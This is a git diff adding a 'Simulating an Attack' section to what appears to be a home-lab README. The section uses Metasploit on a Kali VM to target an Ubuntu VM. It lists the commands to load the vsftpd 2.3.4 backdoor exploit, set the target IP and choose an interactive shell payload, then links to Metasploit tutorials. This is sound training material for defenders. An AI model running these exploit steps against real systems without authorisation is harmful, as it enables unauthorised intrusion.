@@ -106,6 +106,39 @@ Install Splunk:
   ![image](https://github.com/user-attachments/assets/1df131f9-9885-4e75-8002-ef3b25ca8b4a)
 
 
+## Simulating an Attack
+
+### Metasploit
+- Open Terminal in the Kali VM.
+- Type in "msfconsole" to start Metasploit:
+  ![image](https://github.com/user-attachments/assets/2054305d-2586-4d41-9d23-52e1c07f23b0)
+- Once Metaslpoit is started, type in "help" to see the description of each command that you can use in Metasploit:
+  ![image](https://github.com/user-attachments/assets/8d6d3123-027a-4d96-891b-0631140c7d10)
+- Since the Ubuntu VM is the target, search for Linux-specific exploits using the command:
+
+  `search vsftpd`
+  ![image](https://github.com/user-attachments/assets/a05e396d-0dba-4e12-8491-431ab8132f7e)
+
+- Once you have found the exploit that you are looking for, run the following "use" command:
+
+  `use exploit/unix/ftp/vsftpd_234_backdoor`
+- Go to the Terminal in the Ubuntu VM and identify its IP address using the "ifconfig" command. The IP address is under "inet".
+- Return to the Terminal in the Kali VM, in the same tab where Metasploit is running.
+- Set the target using the Ubuntu VM IP address with the "set" command:
+
+  `set RHOST <UBUNTU-VM-IP>`
+- Check compatible payloads using the "show" command:
+
+  `show payloads`
+  ![image](https://github.com/user-attachments/assets/ef5ac111-fca3-4688-b1f4-1712096c3e1d)
+- Set the payload shown:
+
+  `set payload payload/cmd/unix/interact`
+  
+
+
+
+
 
 
 
@@ -115,6 +148,10 @@ Install Splunk:
 - <a href="https://docs.tenable.com/nessus/Content/InstallNessusLinux.htm">Install Tenable Nessus on Linux</a>
 - <a href="https://docs.splunk.com/Documentation/Splunk/9.4.0/Installation/InstallonLinux">Install Splunk on Linux</a>
 - <a href="https://medium.com/@dannyopara/installing-splunk-enterprise-on-ubuntu-step-by-step-guide-b545982038c3">Installing Splunk Enterprise on Ubuntu: Step-by-Step Guide</a>
+- <a href="https://www.hackthebox.com/blog/metasploit-tutorial">A step-by-step guide to the Metasploit Framework</a>
+- <a href="https://www.varonis.com/blog/what-is-metasploit">What is Metasploit? The Beginner's Guide</a>
+- <a href="https://www.eccouncil.org/cybersecurity-exchange/penetration-testing/metasploit-framework-for-penetration-testing/">How To Use The Metasploit Framework For Penetration Testing</a>
+
 
      
 
